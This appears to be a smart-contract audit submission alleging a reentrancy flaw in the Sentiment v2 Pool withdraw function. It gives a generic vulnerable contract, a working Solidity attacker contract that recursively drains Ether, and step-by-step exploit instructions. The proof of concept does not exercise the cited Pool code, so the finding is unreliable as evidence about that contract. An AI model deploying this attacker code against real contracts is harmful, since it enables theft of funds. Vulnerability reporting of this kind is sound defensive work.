# Reentrancy Vulnerability in withdraw function for Pools contract

### Summary

Link: https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L339

The withdraw function transfers Ether to the caller before updating the balance of the caller. This can lead to a reentrancy attack where the attacker can call the withdraw function recursively before the state is updated.

### Root Cause

Lack of reentrancy guard

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Loss of funds.

### PoC

**Vulnerable contract**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // Reentrancy vulnerability here
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    // Helper function to check contract balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
**Attacker Contract**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attacker {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    // Fallback function to receive Ether and recursively call withdraw
    fallback() external payable {
        if (address(vulnerableContract).balance >= msg.value) {
            vulnerableContract.withdraw();
        }
    }

    // Attack function to initiate the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 ether to attack");
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    // Helper function to check the balance of the attacker contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // Withdraw funds from the attacker contract
    function withdrawFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```
**Steps to Exploit**
Deploy the VulnerableContract:
Deploy the vulnerable contract on the blockchain.

**Deploy the Attacker Contract:**
Deploy the attacker contract, passing the address of the deployed VulnerableContract to the constructor.

**Fund the VulnerableContract:**
Deposit some Ether into the VulnerableContract from different accounts.

**Execute the Attack:**
Call the attack function of the Attacker contract with at least 1 Ether. The Attacker contract will then deposit 1 Ether into the VulnerableContract and immediately call withdraw. The fallback function of the Attacker contract will be triggered recursively, draining the VulnerableContract of all its Ether.

**Withdraw Stolen Funds:**
After the attack, the attacker can call withdrawFunds to retrieve all stolen Ether from the Attacker contract.


### Mitigation

Update the balance of the caller before transferring Ether.
